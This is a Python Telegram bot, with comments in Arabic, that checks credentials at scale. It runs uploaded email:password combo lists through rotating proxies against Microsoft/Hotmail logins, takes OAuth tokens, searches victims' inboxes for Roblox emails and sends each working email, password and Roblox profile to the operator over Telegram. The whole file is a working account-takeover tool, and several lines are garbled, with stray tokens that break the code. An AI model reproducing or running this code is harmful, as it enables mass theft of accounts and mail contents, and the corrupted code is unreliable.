import os
import time
import threading
import json
import random
import re
from queue import Queue, Empty

import requests
import telebot
from telebot import types
from flask import Flask
from flask_socketio import SocketIO
from user_agent import generate_user_agent

# --- إعدادات البوت ---
BOT_TOKEN = "" # <--- حط توكن البوت هنا بين الأقواس
ADMIN_ID = 7075895496 # <--- حط ايديك هنا (الرقم اللي طلع لك فوق)

# --- Flask للسيرفر (عشان Render يبقى شغال) ---
app = Flask(__name__)
socketio = SocketIO(app, async_mode="threading")

@app.route("/")
def index():
    return "Bot is running perfectly!"

def keep_alive():
    from threading import Thread
    t = Thread(target=lambda: app.run(host="0.0.0.0", port=10000))
    t.daemon = True
    t.start()

# --- إعدادات البوت والفحص ---
bot = telebot.TeleBot(BOT_TOKEN)
STATE = {
    "running": False,
    "stats": {"hits": 0, "bad": 0, "2fa": 0, "total": 0, "processed": 0},
    "combos": [],
    "proxies": [],
    "workers": 20
}
LOCK = threading.Lock()
STOP_FLAG = threading.Event()

# --- دوال الفحص (نفس اللوجيك حق روبلوكس) ---
def get_user_id(username, proxies=None):
    try:
        r = requests.post("https://users.roblox.com/v1/usernames/users", json={"usernames": [username], "excludeBannedUsers": False}, timeout=10 return, proxies=proxies)
        if r.status_code None == 200 and r.json().get("data
"):
            return r.json()["data"][0]["id"]
    except Exception: pass
    return None

def get_csrf(pro       xies=None):
    s = requests.Session()
    code if proxies: s.proxies = proxies
 =    try:
        r = s.post("https://catalog.roblox.com/v1/catalog/items/details", json={"items": []}, timeout=10)
        return r.headers.get("x-csrf-token"), s
    except Exception: return None, None

def get_asset_names(asset_ids, proxies=None):
    if not asset_ids: return []
    token, session = get_csrf(proxies)
    if not token: return []
    try:
        items = [{"itemType": "Asset", "id": int(a)} for a in asset_ids]
        r = session.post("https://catalog.roblox.com/v1/catalog/items/details", json={"items": items}, headers={"x-csrf-token": token}, timeout=10)
        if r.status_code == 200: return [i.get("name", "Unknown") for i in r.json().get("data", [])]
    except Exception: pass
    return []

def get_roblox_data(username, proxies=None):
    uid = get_user_id(username, proxies)
    if not uid: return None
    try:
        user = requests.get(f"https://users.roblox.com/v1/users/{uid}", timeout=10, proxies=proxies).json()
        friends = requests.get(f"https://friends.roblox.com/v1/users/{uid}/friends/count", timeout=10, proxies=proxies).json()
        wearing = requests.get(f"https://avatar.roblox.com/v1/users/{uid}/currently-wearing", timeout=10, proxies=proxies).json()
        names = get_asset_names(wearing.get("assetIds", []), proxies)
        return {
            "username": username, "friends": friends.get("count", 0),
            "banned": "Yes" if user.get("isBanned", False) else "No",
            "created": (user.get("created") or "").split("T")[0] or "Unknown",
            "profile": f"https://www.roblox.com/users/{uid}/profile", "wearing": names,
        }
    except Exception: return None

def extract_roblox_user(text):
    patterns = [r"account:\s*([a-zA-Z0-9_]+)", r"for\s+([a-zA-Z0-9_]+)\s+and", r"for\s+([a-zA-Z0-9_]+)\."]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m: return m.group(1)
    return None

def check_hotmail(email, password, proxies=None):
    s = requests.Session()
    if proxies: s.proxies = proxies
    try:
        url = (f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D")
        r = s.get(url, headers={"User-Agent": generate_user_agent()}, allow_redirects=True, timeout=15)
        ppft = re.search(r'name="PPFT"\s+value="([^"]+)"', r.text)
        if not ppft: return None
        urlpost = re.search(r'"urlPost":"([^"]+)"', r.text)
        if not urlpost: return None
        data = f"login={email}&loginfmt={email}&passwd={password}&PPFT={ppft.group(1)}&PPSX=Passport&NewUser=1"
        post = s.post(urlpost.group(1), data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}, allow_redirects=False, timeout=15)
        if "__Host-MSAAUTHP" not in s.cookies.get_dict(): None
        loc = post.headers.get("Location", "")
        if "code=" in loc: code = loc.split("code=")[1].split("&")[0]
        if not code: return None
        tok = requests.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data={"client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59", "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D", "grant_type": "authorization_code", "code": code, "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}, timeout=30, proxies=proxies)
        if tok.status_code != 200: return None
        at = tok.json().get("access_token")
        if not at: return None
        cid = s.cookies.get("MSPCID", "").upper()
        if not cid: return None
        search = requests.post("https://outlook.live.com/search/api/v2/query", json={"EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": "no-reply@roblox.com"}, "Size": 25}]}, headers={"Authorization": f"Bearer {at}", "X-AnchorMailbox": f"CID:{cid}"}, timeout=30, proxies=proxies)
        if search.status_code != 200: return None
        uname = extract_roblox_user(search.text)
        if not uname: return None
        rb = get_roblox_data(uname, proxies)
        if not rb: return None
        return {"email": email, "password": password, "roblox": rb}
    except Exception: return None

def parse_proxy(p):
    if not p: return None
    try:
        # يدعم صيغة IP:PORT:USER:PASS
        if p.count(":") == 3:
            ip, port, u, pw = p.split(":", 3)
            return {"http": f"http://{u}:{pw}@{ip}:{port}", "https": f"http://{u}:{pw}@{ip}:{port}"}
        # يدعم صيغة USER:PASS@IP:PORT
        elif "@" in p:
            cred, ipport = p.split("@", 1)
            u, pw = cred.split(":", 1)
            ip, port = ipport.split(":", 1)
            return {"http": f"http://{u}:{pw}@{ip}:{port}", "https": f"http://{u}:{pw}@{ip}:{port}"}
        # يدعم صيغة IP:PORT
        else:
            ip, port = p.split(":", 1)
            return {"http": f"http://{ip}:{port}", "https": f"http://{ip}:{port}"}
    except Exception: return None

def worker(combo_queue):
    while not STOP_FLAG.is_set():
        try: combo = combo_queue.get_nowait()
        except Empty: return
        
        with LOCK: STATE["stats"]["processed"] += 1
        
        try:
            if ":" not in combo: continue
            email, password = combo.split(":", 1)
        except ValueError: continue
            
        proxies = None
        if STATE["proxies"]:
            proxies = random.choice(STATE["proxies"])
            
        result = check_hotmail(email.strip(), password.strip(), proxies)
        
        with LOCK:
            if result: STATE["stats"]["hits"] += 1
            else: STATE["stats"]["bad"] += 1
                
        if result:
            rb = result["roblox"]
            msg = f"<b>✅ ROBLOX HIT!</b>\n\n📧 <b>Email:</b> <code>{email}</code>\n🔑 <b>Pass:</b> <code>{password}</code>\n👤 <b>User:</b> <code>{rb['username']}</code>\n🔗 <a href='{rb['profile']}'>View Profile</a>"
            try: bot.send_message(ADMIN_ID, msg, parse_mode="HTML")
            except: pass

def run_checker():
    with LOCK: STATE["stats"] = {"hits": 0, "bad": 0, "2fa": 0, "total": len(STATE["combos"]), "processed": 0}
    STATE["running"] = True
    STOP_FLAG.clear()
    
    bot.send_message(ADMIN_ID, f"🚀 <b>بدأ الصيد!</b>\n\n📁 الحسابات: <code>{len(STATE['combos'])}</code>\n🌐 البروكسيات: <code>{len(STATE['proxies'])}</code>\n⚙️ الثريدات: <code>{STATE['workers']}</code>", parse_mode="HTML")
    
    combo_q = Queue()
    for c in STATE["combos"]: combo_q.put(c)
        
    threads = []
    for _ in range(min(STATE["workers"], max(1, len(STATE["combos"])))):
        t = threading.Thread(target=worker, args=(combo_q,), daemon=True)
        t.start()
        threads.append(t)
        
    for t in threads: t.join()
        
    STATE["running"] = False
    bot.send_message(ADMIN_ID, f"🏁 <b>خلصنا الصيد!</b>\n\n✅ صيد: <code>{STATE['stats']['hits']}</code>\n❌ خربان: <code>{STATE['stats']['bad']}</code>", parse_mode="HTML")

# --- أوامر البوت ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "عذراً، هذا البوت خاص.")
        return
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn_combo = types.KeyboardButton("📁 رفع ملف الكومبو")
    btn_proxy = types.KeyboardButton("🌐 رفع ملف البروكسي")
    btn_start = types.KeyboardButton("▶️ بدء الصيد")
    btn_stats = types.KeyboardButton("📊 الإحصائيات")
    markup.add(btn_combo, btn_proxy, btn_start, btn_stats)
    
    bot.send_message(message.chat.id, "أهلاً بك في لوحة تحكم ALPHA XK.\nارفع الملفات المطلوبة، وبعدها اضغط بدء الصيد.", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "📁 رفع ملف الكومبو")
def ask_combo(message):
    msg = bot.reply_to(message, "أرسل ملف الكومبو الآن (txt).")
    bot.register_next_step_handler(msg, save_combo)

def save_combo(message):
    if not message.document:
        bot.reply_to(message, "ما وصل ملف، جرب مرة ثانية.")
        return
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    content = downloaded_file.decode('utf-8', errors='ignore')
    combos = [line.strip() for line in content.splitlines() if ":" in line]
    STATE["combos"] = combos
    bot.reply_to(message, f"✅ تم حفظ الكومبو بنجاح! العدد: {len(combos)}")

@bot.message_handler(func=lambda message: message.text == "🌐 رفع ملف البروكسي")
def ask_proxy(message):
    msg = bot.reply_to(message, "أرسل ملف البروكسي الآن (txt).")
    bot.register_next_step_handler(msg, save_proxy)

def save_proxy(message):
    if not message.document:
        bot.reply_to(message, "ما وصل ملف، جرب مرة ثانية.")
        return
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    content = downloaded_file.decode('utf-8', errors='ignore')
    raw_proxies = [line.strip() for line in content.splitlines() if line.strip()]
    
    valid_proxies = []
    for p in raw_proxies:
        parsed = parse_proxy(p)
        if parsed: valid_proxies.append(parsed)
            
    STATE["proxies"] = valid_proxies
    bot.reply_to(message, f"✅ تم حفظ البروكسيات بنجاح! العدد: {len(valid_proxies)}")

@bot.message_handler(func=lambda message: message.text == "▶️ بدء الصيد")
def start_checker(message):
    if STATE["running"]:
        bot.reply_to(message, "⚠️ الفحص شغال حالياً، انتظر يخلص.")
        return
    if not STATE["combos"]:
        bot.reply_to(message, "⚠️ ما رفعت ملف الكومبو!")
        return
        
    threading.Thread(target=run_checker, daemon=True).start()

@bot.message_handler(func=lambda message: message.text == "📊 الإحصائيات")
def send_stats(message):
    s = STATE["stats"]
    status = "شغال 🟢" if STATE["running"] else "متوقف 🔴"
    text = f"<b>📊 الإحصائيات</b>\n\nالحالة: {status}\n✅ الصيد: <code>{s['hits']}</code>\n❌ خربان: <code>{s['bad']}</code>\n📁 الإجمالي: <code>{s['total']}</code>\n⚙️ المعالج: <code>{s['processed']}</code>"
    bot.send_message(message.chat.id, text, parse_mode="HTML")

# --- تشغيل ---
if __name__ == "__main__":
    keep_alive()
    print("Bot is running...")
    bot.infinity_polling()
